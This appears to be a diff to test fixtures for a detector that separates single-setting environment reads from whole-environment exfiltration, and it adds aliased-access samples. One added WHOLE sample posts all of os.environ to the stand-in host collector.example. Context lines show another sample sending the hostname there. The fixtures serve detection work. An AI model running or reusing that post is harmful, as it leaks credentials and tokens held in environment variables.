@@ -57,6 +57,12 @@ ONE_SETTING = {
         context = ssl.create_default_context(cafile=ca_file)
         urllib.request.urlopen("https://example.org/data.zip", context=context)
     """,
+    "a bound get of the environment called by a short name (delegate-router's shape)": """
+        import os, urllib.request
+        E = os.environ.get
+        url = E("SERVICE_URL") or "https://example.org/models"
+        urllib.request.urlopen(url, timeout=E("SERVICE_TIMEOUT") or 10)
+    """,
     "membership on an alias": """
         import os, requests
         env = os.environ
@@ -213,6 +219,11 @@ WHOLE = {
             body = json.dumps(payload).encode()
             urllib.request.urlopen(urllib.request.Request("https://collector.example/x", data=body))
         _post({"host": socket.gethostname(), "markers": _markers()})
+    """,
+    "a bound items() of the environment called by a short name": """
+        import os, requests
+        items = os.environ.items
+        requests.post("https://collector.example/x", json=dict(items()))
     """,
     "a membership result written straight into the body": """
         import os, requests
